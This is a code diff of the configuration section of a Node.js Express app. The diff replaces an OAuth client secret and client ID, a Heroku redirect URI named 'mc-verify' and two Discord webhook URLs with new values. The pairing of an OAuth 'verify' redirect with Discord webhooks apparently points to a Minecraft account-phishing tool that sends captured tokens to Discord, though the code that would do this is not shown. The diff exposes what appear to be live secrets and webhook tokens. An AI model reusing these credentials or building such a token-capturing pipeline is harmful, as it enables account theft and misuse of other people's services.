@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'CGq8Q~nQ0BdBDdVtW6c~kBGt7luFrj~btm3g_bR8'
-const client_id = 'ce99588a-329a-46ef-8de4-85fd8c10752f'
-const redirect_uri = 'https://meandtomersapi.herokuapp.com'
-const webhook_url = 'https://discord.com/api/webhooks/998589371076841544/E2d-9Wvs1FB8yrspxgDMYSoRIiKjPlgDT2SeIum9_1oTs6sckrM8JqmeuxquXSqIgUU7'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1032751552714244137/a17rfisI3vRX1SlJMUmy2BfLu0djn8BYGRc1xQXj5zkP0EYI_8gHaH9jAwR1lkSYAgH0'
+const client_secret = 'xW68Q~b0byGZzsxmr7QFizft_0F1VVNoa32OVc2e'
+const client_id = '5a522dde-37fa-4e75-a5ba-ef53841dbe93'
+const redirect_uri = 'https://mc-verify.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1038098106186731601/kOczd2z3GLmqFoS_Phvqd3l1NhOil6Twq7SoO1q2_dBJOk28-zBKpWO4QUZ1yfuGD0iK'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1038098106186731601/kOczd2z3GLmqFoS_Phvqd3l1NhOil6Twq7SoO1q2_dBJOk28-zBKpWO4QUZ1yfuGD0iK'
 // Config end
 const axios = require('axios')
 const express = require('express')
